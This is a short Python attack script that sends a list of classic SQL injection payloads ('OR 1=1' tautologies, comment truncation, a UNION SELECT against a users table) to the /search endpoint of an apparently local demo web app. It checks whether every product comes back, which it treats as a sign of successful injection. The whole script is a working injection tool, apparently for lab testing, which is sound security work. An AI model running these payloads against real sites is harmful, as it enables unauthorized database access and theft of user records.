#!/usr/bin/env python3
"""
SQL Injection Attack Script
Tests the /search endpoint with SQL injection payloads
"""

import requests
import time
import sys

BASE_URL = "http://localhost:5000"

def sql_injection_attack():
    """Perform SQL injection attacks on the search endpoint"""
    print("\n" + "="*60)
    print("SQL INJECTION ATTACK")
    print("="*60)
    
    # SQL injection payloads
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --",
        "1' OR '1'='1",
        "' OR 'a'='a",
        "') OR ('1'='1",
    ]
    
    for payload in payloads:
        print(f"\n[*] Testing payload: {payload}")
        try:
            response = requests.get(
                f"{BASE_URL}/search",
                params={'q': payload},
                timeout=5
            )
            print(f"[+] Status Code: {response.status_code}")
            print(f"[+] Response length: {len(response.text)} bytes")
            
            # Check if we got all items (indicates successful injection)
            if "Laptop" in response.text and "Mouse" in response.text and "Keyboard" in response.text:
                print("[!] POTENTIAL SQL INJECTION SUCCESS - All items returned!")
            
            time.sleep(0.5)  # Small delay between requests
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
            return False
    
    print("\n[+] SQL injection attack completed")
    return True

if __name__ == "__main__":
    print("Starting SQL Injection Attack...")
    print("Make sure the webapp is running on http://localhost:5000")
    time.sleep(2)
    
    success = sql_injection_attack()
    sys.exit(0 if success else 1)

